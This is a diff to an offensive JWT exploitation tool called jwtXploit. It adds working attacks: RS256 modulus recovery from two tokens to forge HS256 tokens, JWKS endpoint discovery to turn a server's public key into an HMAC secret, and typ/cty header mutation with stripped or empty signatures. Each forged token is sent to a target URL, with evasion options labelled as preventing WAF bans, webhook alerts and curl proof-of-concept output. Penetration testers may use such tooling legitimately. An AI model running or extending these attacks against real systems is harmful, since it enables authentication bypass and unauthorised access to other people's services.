@@ -42,6 +42,10 @@ CONFIG = {
     "output_file":    None,   # -o: path to save the report
     "output_format":  "json", # --format: json | txt | md
     "findings":       [],     # accumulated findings for the report
+    "quiet":          False,  # --quiet: suppress banner/color, machine-readable output only
+    "rate_limit":     0,      # --rate-limit N: max requests/sec (0 = unlimited)
+    "jitter":         0,      # --jitter PCT: random ±PCT% added to rate-limit sleep
+    "webhook":        None,   # --webhook URL: POST JSON to this URL on every confirmed finding
 }
 
 
@@ -65,6 +69,88 @@ def _validate_proxy(proxy_url):
         print(Fore.RED + "    Supported: http://, https://, socks4://, socks5://, socks5h://")
         sys.exit(1)
     return proxy_url
+
+
+# ── Phase 7 helpers ───────────────────────────────────────────
+
+def _rate_sleep():
+    """Sleep between HTTP requests to honour --rate-limit and --jitter."""
+    n = CONFIG.get("rate_limit", 0)
+    if not n:
+        return
+    import random
+    delay = 1.0 / n
+    pct   = CONFIG.get("jitter", 0) / 100.0
+    if pct:
+        delay *= 1 + random.uniform(-pct, pct)
+    time.sleep(max(delay, 0))
+
+
+def _qprint(msg, color=None):
+    """
+    Print that respects --quiet mode.
+    In quiet mode only lines prefixed FOUND: / CLEAN: / ERROR: are emitted
+    (machine-readable for CI pipelines). All others are suppressed.
+    """
+    if CONFIG.get("quiet"):
+        if any(msg.lstrip().startswith(p) for p in ("FOUND:", "CLEAN:", "ERROR:", "INFO:")):
+            print(msg)
+        return
+    if color:
+        print(color + msg)
+    else:
+        print(msg)
+
+
+def _notify_webhook(finding):
+    """POST a confirmed finding JSON to the configured --webhook URL (fire-and-forget)."""
+    url = CONFIG.get("webhook")
+    if not url:
+        return
+    payload = {
+        "source":   "jwtXploit",
+        "attack":   finding.get("attack"),
+        "token":    finding.get("token", "")[:120],
+        "delivery": finding.get("delivery"),
+        "reason":   finding.get("verify_reason"),
+        "cve":      str(_cve_for_attack(finding.get("attack", ""))),
+        "time":     finding.get("timestamp"),
+    }
+    # Slack-compatible format
+    slack_text = (
+        f"🚨 *jwtXploit — JWT Vulnerability Confirmed*\n"
+        f">*Attack:* {payload['attack']}\n"
+        f">*CVE:* {payload['cve']}\n"
+        f">*Via:* {payload['delivery']}\n"
+        f">*Reason:* {payload['reason']}\n"
+        f">*Token (truncated):* `{payload['token']}`"
+    )
+    body = {"text": slack_text, "data": payload}
+    try:
+        requests.post(url, json=body, timeout=5)
+    except Exception:
+        pass  # webhook failures must never interrupt the scan
+
+
+def _poc_curl(token, delivery, url, method="GET"):
+    """
+    Build and return a ready-to-paste curl PoC command for a confirmed finding.
+    delivery is one of the delivery string values stored in CONFIG['findings'].
+    """
+    method_flag = "" if method == "GET" else f"-X {method} "
+    token_short = token[:80] + ("..." if len(token) > 80 else "")
+
+    if delivery and delivery.startswith("Cookie:"):
+        cookie_name = delivery.split("Cookie:", 1)[1].strip()
+        return f'curl -sk {method_flag}-b "{cookie_name}={token}" "{url}"'
+    elif delivery and delivery.startswith("Authorization:"):
+        scheme = delivery.split("Authorization:", 1)[1].strip()
+        return f'curl -sk {method_flag}-H "Authorization: {scheme} {token}" "{url}"'
+    elif delivery:
+        # custom header like X-Auth-Token
+        return f'curl -sk {method_flag}-H "{delivery}: {token}" "{url}"'
+    else:
+        return f'curl -sk {method_flag}-H "Authorization: Bearer {token}" "{url}"'
 
 
 def gold_gradient_text(text):
@@ -237,6 +323,9 @@ CVE_MAP = {
     "null_sig":       ("N/A",            "7.5", "Null/stripped signature accepted by JWT library"),
     "weak_key":       ("N/A",            "8.8", "Weak or guessable HMAC signing secret"),
     "x5c_inject":     ("CVE-2018-0114",  "9.8", "x5c self-signed certificate injection — server trusts embedded cert"),
+    "typ_cty":        ("N/A",            "7.5", "typ/cty header mutation — bypasses audience/scope validation"),
+    "sig2n":          ("N/A",            "9.1", "sig2n key recovery — RS256 public key recovered from 2 tokens"),
+    "jwks_disc":      ("N/A",            "9.1", "JWKS discovery key confusion — real server key used as HMAC secret"),
 }
 
 # Maps attack name substrings → CVE_MAP keys (for print_result lookup)
@@ -255,6 +344,10 @@ _ATTACK_CVE_KEYS = {
     "null signature":         "null_sig",
     "weak signing":           "weak_key",
     "x5c":                    "x5c_inject",
+    "typ/cty":                "typ_cty",
+    "sig2n":                  "sig2n",
+    "jwks key discovery":     "jwks_disc",
+    "jwks endpoint":          "jwks_disc",
 }
 
 
@@ -442,6 +535,12 @@ def save_report(output_file, fmt):
                     "and never trust header-supplied keys.",
                     "",
                 ]
+                if f.get("poc_curl"):
+                    lines += [
+                        "**PoC curl command:**",
+                        f"```bash\n{f['poc_curl']}\n```",
+                        "",
+                    ]
         else:
             lines.append("_No tokens were confirmed accepted during this scan._")
 
@@ -698,18 +797,23 @@ def check_url(token, url=None):
 
     # Delivery attempt 1: Authorization: Bearer <token>
     print(Fore.CYAN + f"[+] Testing  Authorization: Bearer  ({method})...")
+    _rate_sleep()
     try:
         resp = session.request(method, url, headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
         print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
         ok, reason = is_success(resp)
         if ok:
+            delivery = "Authorization: Bearer"
             print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED!  Reason: {reason}")
             print_response_details(resp)
-            print(Fore.GREEN + Style.BRIGHT + f"\n[*] Accepted JWT:\n{token}")
+            curl = _poc_curl(token, delivery, url, method)
+            print(Fore.GREEN + Style.BRIGHT + f"\n[*] PoC curl:\n{curl}")
+            if CONFIG["quiet"]:
+                print(f"FOUND: {delivery} | {reason} | {url}")
             if CONFIG["findings"]:
-                CONFIG["findings"][-1]["verified"]      = True
-                CONFIG["findings"][-1]["verify_reason"] = reason
-                CONFIG["findings"][-1]["delivery"]      = "Authorization: Bearer"
+                CONFIG["findings"][-1].update({"verified": True, "verify_reason": reason,
+                                               "delivery": delivery, "poc_curl": curl})
+                _notify_webhook(CONFIG["findings"][-1])
             return
     except Exception as e:
         print(Fore.RED + f"[!] Request error (Bearer header): {e}")
@@ -717,18 +821,23 @@ def check_url(token, url=None):
     # Delivery attempt 2: Cookie variants
     for cookie_name in ["session", "jwt", "auth", "token"]:
         print(Fore.CYAN + f"[+] Testing  cookie '{cookie_name}'  ({method})...")
+        _rate_sleep()
         try:
             resp = session.request(method, url, cookies={cookie_name: token}, timeout=timeout)
             print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
             ok, reason = is_success(resp)
             if ok:
+                delivery = f"Cookie: {cookie_name}"
                 print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED via cookie '{cookie_name}'!  Reason: {reason}")
                 print_response_details(resp)
-                print(Fore.GREEN + Style.BRIGHT + f"\n[*] Accepted JWT:\n{token}")
+                curl = _poc_curl(token, delivery, url, method)
+                print(Fore.GREEN + Style.BRIGHT + f"\n[*] PoC curl:\n{curl}")
+                if CONFIG["quiet"]:
+                    print(f"FOUND: {delivery} | {reason} | {url}")
                 if CONFIG["findings"]:
-                    CONFIG["findings"][-1]["verified"]      = True
-                    CONFIG["findings"][-1]["verify_reason"] = reason
-                    CONFIG["findings"][-1]["delivery"]      = f"Cookie: {cookie_name}"
+                    CONFIG["findings"][-1].update({"verified": True, "verify_reason": reason,
+                                                   "delivery": delivery, "poc_curl": curl})
+                    _notify_webhook(CONFIG["findings"][-1])
                 return
         except Exception as e:
             print(Fore.RED + f"[!] Request error (cookie '{cookie_name}'): {e}")
@@ -745,20 +854,24 @@ def check_url(token, url=None):
         ("Api-Key",         token),
     ]
     for hdr_name, hdr_value in HEADER_VARIANTS:
-        label = f"{hdr_name}: {hdr_value[:40]}..."
         print(Fore.CYAN + f"[+] Testing  {hdr_name}  ({method})...")
+        _rate_sleep()
         try:
             resp = session.request(method, url, headers={hdr_name: hdr_value}, timeout=timeout)
             print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
             ok, reason = is_success(resp)
             if ok:
+                delivery = f"{hdr_name}"
                 print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED via '{hdr_name}'!  Reason: {reason}")
                 print_response_details(resp)
-                print(Fore.GREEN + Style.BRIGHT + f"\n[*] Accepted JWT:\n{token}")
+                curl = _poc_curl(token, delivery, url, method)
+                print(Fore.GREEN + Style.BRIGHT + f"\n[*] PoC curl:\n{curl}")
+                if CONFIG["quiet"]:
+                    print(f"FOUND: {delivery} | {reason} | {url}")
                 if CONFIG["findings"]:
-                    CONFIG["findings"][-1]["verified"]      = True
-                    CONFIG["findings"][-1]["verify_reason"] = reason
-                    CONFIG["findings"][-1]["delivery"]      = f"{hdr_name}"
+                    CONFIG["findings"][-1].update({"verified": True, "verify_reason": reason,
+                                                   "delivery": delivery, "poc_curl": curl})
+                    _notify_webhook(CONFIG["findings"][-1])
                 return
         except Exception as e:
             print(Fore.RED + f"[!] Request error ('{hdr_name}'): {e}")
@@ -1695,6 +1808,342 @@ def attack_x5c_injection(token, url=None):
         print(Fore.RED + f"[-] x5c injection error: {e}")
 
 
+# ──────────────────────────────────────────────────────────────
+#  ATTACK #14 — sig2n RS256 KEY RECOVERY
+# ──────────────────────────────────────────────────────────────
+
+def _pkcs1_padded_int(msg_bytes, key_bits=2048):
+    """
+    Build the PKCS#1 v1.5 padded integer for an RSA-SHA256 signature.
+    Layout (for 2048-bit key):
+        0x00 0x01 [0xFF * padding_len] 0x00 [DigestInfo DER] [SHA-256 hash 32B]
+    """
+    digest_info = bytes.fromhex("3031300d060960864801650304020105000420")
+    key_bytes   = key_bits // 8
+    pad_len     = key_bytes - 3 - len(digest_info) - len(msg_bytes)
+    if pad_len < 8:
+        raise ValueError("Key size too small for PKCS#1 v1.5 padding")
+    padded = b'\x00\x01' + b'\xff' * pad_len + b'\x00' + digest_info + msg_bytes
+    return int.from_bytes(padded, 'big')
+
+
+def discover_rsa_n(token1, token2, key_bits=2048):
+    """
+    Recover the RSA modulus n from two JWT tokens signed with the same RS256 key.
+
+    Math:
+        sig^e ≡ PKCS1_padded(hash) (mod n)
+        ⇒  sig^e - PKCS1_padded(hash) ≡ 0 (mod n)
+        ⇒  n | gcd( sig1^e - m1,  sig2^e - m2 )
+
+    Returns the recovered RSA public key as PEM bytes, or None on failure.
+    """
+    import math
+    import hashlib
+
+    E = 65537
+
+    def extract_parts(tok):
+        parts = tok.split(".")
+        if len(parts) != 3:
+            raise ValueError("Not a 3-part JWT")
+        h_b64, p_b64, s_b64 = parts
+        signing_input = f"{h_b64}.{p_b64}".encode()
+        msg_hash      = hashlib.sha256(signing_input).digest()
+        sig_bytes     = base64.urlsafe_b64decode(s_b64 + "==")
+        sig_int       = int.from_bytes(sig_bytes, "big")
+        padded_int    = _pkcs1_padded_int(msg_hash, key_bits)
+        return sig_int, padded_int
+
+    try:
+        s1, m1 = extract_parts(token1)
+        s2, m2 = extract_parts(token2)
+    except Exception as e:
+        print(Fore.RED + f"[-] sig2n: failed to parse tokens — {e}")
+        return None
+
+    print(Fore.CYAN + "[*] sig2n: Computing pow(sig1, e) and pow(sig2, e)  (may take a few seconds)...")
+    n1 = pow(s1, E) - m1
+    n2 = pow(s2, E) - m2
+
+    print(Fore.CYAN + "[*] sig2n: Computing GCD...")
+    n_candidate = math.gcd(n1, n2)
+
+    # GCD may be a multiple of n — divide out small factors until we get the right bit-length
+    for factor in [2, 3, 5, 7, 11, 13, 17, 19, 23]:
+        while n_candidate % factor == 0 and n_candidate.bit_length() > key_bits:
+            n_candidate //= factor
+
+    if n_candidate.bit_length() not in range(key_bits - 8, key_bits + 8):
+        print(Fore.RED + f"[-] sig2n: Recovered n has unexpected size ({n_candidate.bit_length()} bits). "
+              "Try --key-bits 4096 if the server uses 4096-bit keys.")
+        return None
+
+    # Verify: pow(sig1, E, n) should equal m1 % n
+    check = pow(s1, E, n_candidate)
+    if check != m1 % n_candidate:
+        print(Fore.RED + "[-] sig2n: Verification failed — tokens may not share the same key, or key is not 2048-bit.")
+        return None
+
+    print(Fore.GREEN + f"[+] sig2n: RSA modulus recovered!  ({n_candidate.bit_length()} bits)")
+    pub_numbers = RSAPublicNumbers(e=E, n=n_candidate)
+    pub_key     = pub_numbers.public_key(default_backend())
+    pub_pem     = pub_key.public_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo,
+    )
+    return pub_pem
+
+
+def attack_sig2n(token, url=None, token2=None):
+    """
+    sig2n: Recover the RSA public key from two tokens signed with the same RS256/PS256 key,
+    then use that public key as the HMAC secret for HS256 (algorithm confusion).
+    No prior knowledge of the public key required — only two valid tokens needed.
+    """
+    hdr = get_header(token)
+    if hdr.get("alg", "").upper() not in ("RS256", "RS384", "RS512", "PS256", "PS384", "PS512"):
+        print(Fore.YELLOW + "[!] sig2n works on RS/PS algorithms only. Current alg: " + hdr.get("alg", "?"))
+
+    if not token2:
+        if CONFIG.get("autopwn"):
+            print(Fore.YELLOW + "[AUTOPWN] sig2n skipped — needs --sig2n TOKEN2 (a second valid RS256 token).")
+            return
+        token2 = input(Fore.YELLOW + "[?] Enter second RS256 token (signed with the same key): ").strip()
+        if not token2:
+            print(Fore.RED + "[-] sig2n requires two tokens. Skipping.")
+            return
+
+    pub_pem = discover_rsa_n(token, token2)
+    if not pub_pem:
+        return
+
+    print(Fore.GREEN + "\n[+] Recovered public key (PEM):")
+    print(Fore.GREEN + pub_pem.decode())
+
+    decoded = decode_token(token)
+    print(Fore.CYAN + "\n[+] Edit JWT Payload for sig2n HS256 forgery:")
+    modified_payload = interactive_edit_dict("Token payload", decoded)
+
+    forged_header = dict(hdr)
+    forged_header["alg"] = "HS256"
+
+    try:
+        forged_token = manual_hs256_sign(forged_header, modified_payload, pub_pem)
+        print_result("sig2n — RS256 Key Recovery → HS256 Confusion", forged_token, modified_payload, forged_header)
+        check_url(forged_token, url)
+    except Exception as e:
+        print(Fore.RED + f"[-] sig2n forgery error: {e}")
+
+
+# ──────────────────────────────────────────────────────────────
+#  JWKS ENDPOINT AUTO-DISCOVERY
+# ──────────────────────────────────────────────────────────────
+
+_JWKS_PATHS = [
+    "/.well-known/jwks.json",
+    "/.well-known/openid-configuration",
+    "/jwks.json",
+    "/jwks",
+    "/api/auth/jwks",
+    "/api/auth/keys",
+    "/auth/jwks.json",
+    "/oauth/v2/keys",
+    "/oauth2/v1/keys",
+    "/v1/keys",
+    "/v2/keys",
+    "/keys",
+    "/api/keys",
+    "/api/v1/jwks",
+    "/auth/keys",
+    "/.well-known/oauth-authorization-server",
+    "/api/oauth/jwks",
+    "/.well-known/public-keys",
+    "/publickeys",
+    "/certs",
+]
+
+
+def discover_jwks(base_url):
+    """
+    Try 20 common JWKS endpoint paths on base_url.
+    Returns (jwks_url, key_list) on the first successful hit, or (None, None).
+    """
+    session = requests.Session()
+    if CONFIG["proxy"]:
+        session.proxies = {"http": CONFIG["proxy"], "https": CONFIG["proxy"]}
+    session.verify = CONFIG["ssl_verify"]
+
+    # Strip to scheme + host
+    from urllib.parse import urlparse, urljoin
+    parsed   = urlparse(base_url)
+    base     = f"{parsed.scheme}://{parsed.netloc}"
+
+    print(Fore.CYAN + f"\n[*] JWKS Discovery — probing {len(_JWKS_PATHS)} paths on {base}...")
+
+    for path in _JWKS_PATHS:
+        url = urljoin(base, path)
+        try:
+            r = session.get(url, timeout=CONFIG["timeout"])
+            if r.status_code != 200:
+                continue
+            data = r.json()
+            # openid-configuration redirects to jwks_uri
+            if "jwks_uri" in data:
+                jwks_url = data["jwks_uri"]
+                r2 = session.get(jwks_url, timeout=CONFIG["timeout"])
+                if r2.status_code == 200:
+                    data = r2.json()
+                    url  = jwks_url
+            if "keys" in data and isinstance(data["keys"], list) and data["keys"]:
+                print(Fore.GREEN + f"[+] JWKS found at: {url}  ({len(data['keys'])} key(s))")
+                return url, data["keys"]
+        except Exception:
+            continue
+
+    print(Fore.YELLOW + "[-] JWKS not found at any known path.")
+    return None, None
+
+
+def _jwks_key_to_pem(key_dict):
+    """
+    Convert a JWKS RSA key entry (with n, e fields) to a PEM public key.
+    Returns PEM bytes or None.
+    """
+    try:
+        def b64_to_int(s):
+            return int.from_bytes(base64.urlsafe_b64decode(s + "=="), "big")
+        n = b64_to_int(key_dict["n"])
+        e = b64_to_int(key_dict["e"])
+        pub = RSAPublicNumbers(e=e, n=n).public_key(default_backend())
+        return pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
+    except Exception:
+        return None
+
+
+def attack_jwks_discovery(token, url=None):
+    """
+    Auto-discover the JWKS endpoint from the target URL, extract the real RSA public key,
+    and use it as the HMAC secret for an HS256 algorithm confusion attack.
+    """
+    if not url:
+        if CONFIG.get("autopwn"):
+            print(Fore.YELLOW + "[AUTOPWN] JWKS discovery skipped — no --url provided.")
+            return
+        url = input(Fore.YELLOW + "[?] Enter the target URL (used to discover JWKS base): ").strip()
+        if not url:
+            return
+
+    jwks_url, keys = discover_jwks(url)
+    if not keys:
+        print(Fore.YELLOW + "[!] JWKS discovery found nothing. Try --url with the API base (e.g. https://api.target.com).")
+        return
+
+    rsa_keys = [k for k in keys if k.get("kty") == "RSA"]
+    if not rsa_keys:
+        print(Fore.YELLOW + "[!] No RSA keys found in JWKS (only EC/oct). Algorithm confusion requires RSA.")
+        return
+
+    print(Fore.GREEN + f"[+] {len(rsa_keys)} RSA key(s) found — trying each as HS256 secret...")
+
+    decoded  = decode_token(token)
+    original_header = get_header(token)
+    print(Fore.CYAN + "\n[+] Edit JWT Payload for JWKS-discovered key confusion:")
+    modified_payload = interactive_edit_dict("Token payload", decoded)
+
+    for i, key in enumerate(rsa_keys, 1):
+        kid = key.get("kid", f"key-{i}")
+        pub_pem = _jwks_key_to_pem(key)
+        if not pub_pem:
+            print(Fore.YELLOW + f"[-] Could not parse key {kid} — skipping.")
+            continue
+
+        forged_header = dict(original_header)
+        forged_header["alg"] = "HS256"
+        forged_header.pop("kid", None)
+
+        try:
+            forged_token = manual_hs256_sign(forged_header, modified_payload, pub_pem)
+            print_result(f"JWKS Key Discovery Confusion — key '{kid}'", forged_token,
+                         modified_payload, forged_header)
+            check_url(forged_token, url)
+        except Exception as e:
+            print(Fore.RED + f"[-] Key '{kid}' confusion failed: {e}")
+
+
+# ──────────────────────────────────────────────────────────────
+#  ATTACK #15 — cty / typ HEADER MUTATION
+# ──────────────────────────────────────────────────────────────
+
+_TYP_MUTATIONS = [
+    # Standard / expected values
+    ("typ", "JWT"),
+    ("typ", "at+JWT"),
+    ("typ", "dpop+jwt"),
+    ("typ", "secevent+jwt"),
+    ("typ", "application/jwt"),
+    ("typ", "jose"),
+    ("typ", "jose+json"),
+    # All-caps variants some parsers handle differently
+    ("typ", "ACCESS_TOKEN"),
+    ("typ", "BEARER"),
+    ("typ", "ID_TOKEN"),
+    # Absent / empty — some libs treat missing typ as permissive
+    ("typ", ""),
+    # cty (content type) mutations — used in nested JWTs
+    ("cty", "JWT"),
+    ("cty", "json"),
+    ("cty", "application/json"),
+    ("cty", "text/plain"),
+]
+
+
+def attack_typ_cty_mutation(token, url=None):
+    """
+    typ/cty Header Mutation.
+    Iterate 15 typ and cty values and test each against the target.
+    Some JWT libraries apply different validation rules (audience, scope,
+    token-binding) depending on the typ value — a mismatch can bypass checks.
+    """
+    decoded         = decode_token(token)
+    original_header = get_header(token)
+
+    print(Fore.CYAN + "\n[+] Edit JWT Payload for typ/cty mutation:")
+    modified_payload = interactive_edit_dict("Token payload", decoded)
+
+    print(Fore.CYAN + f"\n[*] Trying {len(_TYP_MUTATIONS)} typ/cty header values...")
+    for claim, value in _TYP_MUTATIONS:
+        mutated_header = dict(original_header)
+        if value == "":
+            mutated_header.pop(claim, None)
+            label = f"{claim}: <absent>"
+        else:
+            mutated_header[claim] = value
+            label = f"{claim}: {value}"
+
+        try:
+            # Use HS256 with empty secret (relies on server not validating sig)
+            alg = mutated_header.get("alg", "HS256")
+            if alg.startswith("HS"):
+                forged = jwt.encode(apply_exp_strip(dict(modified_payload)), "",
+                                    algorithm=alg, headers=mutated_header)
+            else:
+                # For RS/ES just strip signature like null-sig attack
+                h_b64 = base64.urlsafe_b64encode(
+                    json.dumps(mutated_header, separators=(",", ":")).encode()
+                ).rstrip(b"=").decode()
+                p_b64 = base64.urlsafe_b64encode(
+                    json.dumps(apply_exp_strip(dict(modified_payload)),
+                               separators=(",", ":")).encode()
+                ).rstrip(b"=").decode()
+                forged = f"{h_b64}.{p_b64}."
+
+            print_result(f"typ/cty Mutation — {label}", forged, modified_payload, mutated_header)
+            check_url(forged, url)
+        except Exception as e:
+            print(Fore.RED + f"[-] Mutation '{label}' error: {e}")
+
+
 def run_autopwn(token, url, wordlist=None):
     """Run all automatable attack vectors non-interactively and test each against URL."""
     if not url:
@@ -1724,6 +2173,8 @@ def run_autopwn(token, url, wordlist=None):
         ("ES256 Psychic Signature",     attack_es256_psychic_signature),
         ("Library Fingerprint",         fingerprint_jwt_library),
         ("x5c Header Injection",        attack_x5c_injection),
+        ("typ/cty Header Mutation",     attack_typ_cty_mutation),
+        ("JWKS Key Discovery Confusion",attack_jwks_discovery),
     ]
     if wordlist:
         autopwn_attacks.append(
@@ -1828,27 +2279,45 @@ def main():
     print_banner()
 
     parser = argparse.ArgumentParser(description="JWT Exploitation Tool")
-    parser.add_argument("token",              nargs="?", default=None, help="JWT token to test (omit when using --batch)")
+    parser.add_argument("token",              nargs="?", default=None, help="JWT token to test (omit when using --batch or --env)")
     parser.add_argument("-w", "--wordlist",   help="Wordlist path (for weak signing key brute force)")
     parser.add_argument("--url",              help="Target endpoint URL to test tokens against")
     parser.add_argument("--proxy",            help="Proxy URL: http://host:port  |  socks5h://host:port  (socks5h routes DNS through proxy too; needs PySocks)")
-    parser.add_argument("--no-ssl-verify",    action="store_true", help="Disable SSL certificate verification (useful for self-signed certs)")
+    parser.add_argument("--no-ssl-verify",    action="store_true", help="Disable SSL certificate verification")
     parser.add_argument("--timeout",          type=int, default=10, metavar="SEC", help="HTTP request timeout in seconds (default: 10)")
     parser.add_argument("--autopwn",          action="store_true", help="Run ALL automatable attacks non-interactively and test each against --url")
-    parser.add_argument("--escalate-role",    metavar="ROLE", help="In autopwn mode, auto-set role/admin/sub claims to this value (e.g. admin)")
+    parser.add_argument("--escalate-role",    metavar="ROLE", help="Auto-set role/admin/sub claims to this value in autopwn/batch (e.g. admin)")
     parser.add_argument("--strip-exp",        action="store_true", help="Remove nbf/iat and push exp 10 years forward before signing every token")
     parser.add_argument("--hashcat",          action="store_true", help="Use GPU hashcat for brute force instead of Python threaded mode")
     parser.add_argument("--decode",           action="store_true", help="Decode and analyse the token without attacking (recon mode)")
     parser.add_argument("--batch",            metavar="FILE", help="Batch file: one token (or token::url) per line — runs autopwn on each")
+    parser.add_argument("--sig2n",            metavar="TOKEN2", help="Second RS256 token for sig2n key recovery (attack #14)")
+    parser.add_argument("--discover-jwks",    action="store_true", help="Auto-discover JWKS endpoint from --url and run key-confusion")
+    parser.add_argument("--key-bits",         type=int, default=2048, metavar="N", help="RSA key size hint for sig2n (default: 2048)")
+    parser.add_argument("--rate-limit",       type=float, default=0, metavar="N", help="Max HTTP requests/sec — 0=unlimited. Prevents WAF bans.")
+    parser.add_argument("--jitter",           type=float, default=0, metavar="PCT", help="Random ±PCT%% jitter on --rate-limit sleep (e.g. 20)")
+    parser.add_argument("--webhook",          metavar="URL", help="POST confirmed findings JSON to this URL (Slack/Discord/custom)")
+    parser.add_argument("--quiet",            action="store_true", help="Machine-readable output for CI — suppress banner/color, exit 1 on finding")
+    parser.add_argument("--env",              action="store_true", help="Read token from $JWTX_TOKEN, url from $JWTX_URL (keeps secrets out of shell history)")
     parser.add_argument("-o", "--output",     metavar="FILE", help="Save report to this file after the session")
     parser.add_argument("--format",           choices=["json", "txt", "md"], default="json", metavar="FMT", help="Report format: json (default), txt, or md")
     args = parser.parse_args()
 
+    # --env: load token and url from environment variables
+    if args.env:
+        env_token = os.environ.get("JWTX_TOKEN", "").strip()
+        env_url   = os.environ.get("JWTX_URL",   "").strip()
+        if not env_token:
+            print("ERROR: --env set but $JWTX_TOKEN is empty")
+            sys.exit(1)
+        args.token = args.token or env_token
+        args.url   = args.url   or env_url or None
+
     # Require either token or --batch
     if not args.token and not args.batch:
-        parser.error("provide a token positional argument or use --batch FILE")
+        parser.error("provide a token, use --batch FILE, or use --env")
 
-    # Populate global config from parsed args
+    # Populate global config
     CONFIG["proxy"]          = _validate_proxy(args.proxy)
     CONFIG["ssl_verify"]     = not args.no_ssl_verify
     CONFIG["timeout"]        = args.timeout
@@ -1859,12 +2328,22 @@ def main():
     CONFIG["use_hashcat"]    = args.hashcat
     CONFIG["output_file"]    = args.output
     CONFIG["output_format"]  = args.format
+    CONFIG["quiet"]          = args.quiet
+    CONFIG["rate_limit"]     = args.rate_limit
+    CONFIG["jitter"]         = args.jitter
+    CONFIG["webhook"]        = args.webhook
+
+    if args.quiet:
+        print(f"INFO: jwtXploit  token={str(args.token or 'batch')[:30]}...  url={args.url or 'none'}")
 
     # ── BATCH MODE ───────────────────────────────────────────────
     if args.batch:
         run_batch(args.batch, wordlist=args.wordlist)
         if CONFIG["output_file"]:
             save_report(CONFIG["output_file"], CONFIG["output_format"])
+        if CONFIG["quiet"]:
+            confirmed = sum(1 for f in CONFIG["findings"] if f.get("verified"))
+            sys.exit(1 if confirmed else 0)
         return
 
     # Always scan payload for embedded secrets on load
@@ -1875,17 +2354,29 @@ def main():
         decode_mode(args.token)
         return
 
-    # Print attack recommendations based on token header (quick, always shown)
+    # --discover-jwks: fast-track to JWKS discovery attack
+    if args.discover_jwks:
+        attack_jwks_discovery(args.token, args.url)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
+        return
+
+    # Print attack recommendations (always shown)
     header  = get_header(args.token)
     payload = decode_token(args.token)
     recommend_attacks(header, payload)
     print()
 
-    # Autopwn mode — skip menu, run everything automatically
+    # Autopwn mode — skip menu
     if args.autopwn:
+        if args.sig2n:
+            attack_sig2n(args.token, args.url, token2=args.sig2n)
         run_autopwn(args.token, args.url, wordlist=args.wordlist)
         if CONFIG["output_file"]:
             save_report(CONFIG["output_file"], CONFIG["output_format"])
+        if CONFIG["quiet"]:
+            confirmed = sum(1 for f in CONFIG["findings"] if f.get("verified"))
+            sys.exit(1 if confirmed else 0)
         return
 
     attacks = {
@@ -1902,6 +2393,9 @@ def main():
         "11": ("KID SSRF",                                        attack_kid_ssrf),
         "12": ("JWT Library Fingerprinting",                      fingerprint_jwt_library),
         "13": ("x5c Header Injection",                            attack_x5c_injection),
+        "14": ("sig2n RS256 Key Recovery → HS256 Confusion",     lambda t, u: attack_sig2n(t, u, token2=args.sig2n)),
+        "15": ("typ/cty Header Mutation (15 variants)",          attack_typ_cty_mutation),
+        "16": ("JWKS Endpoint Discovery + Key Confusion",        attack_jwks_discovery),
     }
 
     print(Fore.CYAN + "[*] Choose an attack method:")
